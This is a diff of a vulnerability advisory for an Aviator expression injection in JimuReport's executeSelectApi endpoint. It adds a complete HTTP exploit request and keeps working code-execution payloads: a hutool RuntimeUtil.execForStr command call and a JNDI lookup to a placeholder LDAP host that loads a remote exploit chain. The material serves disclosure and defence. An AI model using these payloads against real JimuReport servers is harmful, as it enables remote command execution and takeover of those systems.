@@ -1,36 +1,69 @@
-# jimureport aviator expression injection (≤ v2.3.0)
+# jimureport aviator expression injection (≤ v2.3.4)
 
 **Product**: jimureport
 
-**Affected Versions**: ≤ v2.3.0
+**Affected Versions**: ≤ v2.3.4
 
 **address**: https://github.com/jeecgboot/jimureport
 
 ## Vulnerability Description
 
-JimuReport versions 2.3.0 and below do not effectively restrict user input, directly delegating it to the `execute` method of the aviator expression, which leads to aviator expression injection.
+JimuReport versions 2.3.0 and below at `/jmreport/executeSelectApi` API do not effectively restrict user input, directly delegating it to the `execute` method of the aviator expression, which leads to aviator expression injection.
 
 ## POC
 
-### payload
+Vulnerable interface front-end location:
+
+![image-20260609101547363](C:\Users\13903\AppData\Roaming\Typora\typora-user-images\image-20260609101547363.png)
+
+The vulnerability is triggered by entering arbitrary report parameters and then clicking the API parsing button.
+
+![image-20260609101825479](C:\Users\13903\AppData\Roaming\Typora\typora-user-images\image-20260609101825479.png)
+
+The vulnerability lies in the paramValue parameter, which, under certain conditions, can parse aviator expressions.
+
+```http
+POST /jmreport/executeSelectApi?token=1d478d2b-0e8e-45dc-9c5c-cbdea71173c2 HTTP/1.1
+Host: 192.168.239.1:8085
+Content-Length: 505
+tenantId: null
+X-TIMESTAMP: 1780971264913
+X-Access-Token: 1d478d2b-0e8e-45dc-9c5c-cbdea71173c2
+X-Sign: DD0F6865D5F752F96B51B72EB56FFD5E
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+Accept: application/json, text/plain, */*
+Content-Type: application/x-www-form-urlencoded
+X-Tenant-Id: null
+token: 1d478d2b-0e8e-45dc-9c5c-cbdea71173c2
+JmReport-Tenant-Id: null
+Origin: http://192.168.239.1:8085
+Referer: http://192.168.239.1:8085/doLogin?username=admin&password=123456
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+
+api=http%3A%2F%2F127.0.0.1%2Faaa&method=0&apiConvert=&paramArray=%5B%7B%22paramName%22%3A%22test%22%2C%22paramTxt%22%3A%22123%22%2C%22paramValue%22%3A%22%3Duse%20cn.hutool.core.util.%2A%3BRuntimeUtil.execForStr%28seq.array%28java.lang.String%2C%20%5C%22calc%5C%22%29%29%22%2C%22orderNum%22%3A1%2C%22tableIndex%22%3A1%2C%22extJson%22%3A%22%22%2C%22dictCode%22%3A%22utf-8%22%2C%22_index%22%3A0%2C%22_rowKey%22%3A12%2C%22widgetType%22%3A%22number%22%2C%22searchMode%22%3A1%2C%22searchFormat%22%3A%22111%22%7D%5D
+```
+Two payloads can be used: one based on JNDI injection, and the other loading the command execution method that comes with hutool.
 
 ```java
 =use javax.naming.*;InitialContext.doLookup("ldap://x.x.x.x:x/exp")
 ```
+
 Use java-chains to generate DruidJdbcAttack-H2 command execution chains.
 https://github.com/vulhub/java-chains
 <img width="1549" height="626" alt="image" src="https://github.com/user-attachments/assets/d86516b8-2259-4785-8fc5-eb2fb93edf3f" />
 
-<img width="1873" height="827" alt="image" src="https://github.com/user-attachments/assets/56faf2ee-e03f-463b-aeda-2efa13ebd309" />
+![image-20260609111039094](C:\Users\13903\AppData\Roaming\Typora\typora-user-images\image-20260609111039094.png)
 
 ```java
 =use cn.hutool.core.util.*;RuntimeUtil.execForStr(seq.array(java.lang.String, "calc"))
 ```
 Because of the hutool-core dependency, the built-in `RuntimeUtil.execForStr` method can be used to execute commands.
-<img width="1872" height="853" alt="image" src="https://github.com/user-attachments/assets/47c6e757-983e-4da7-b00f-162b2adbda4f" />
+![image-20260609100634323](C:\Users\13903\AppData\Roaming\Typora\typora-user-images\image-20260609100634323.png)
 
 
-### code
+## code
 
 The vulnerability in the `/jmreport/executeSelectApi` interface, located in `org.jeecg.modules.jmreport.desreport.b.a`.
 
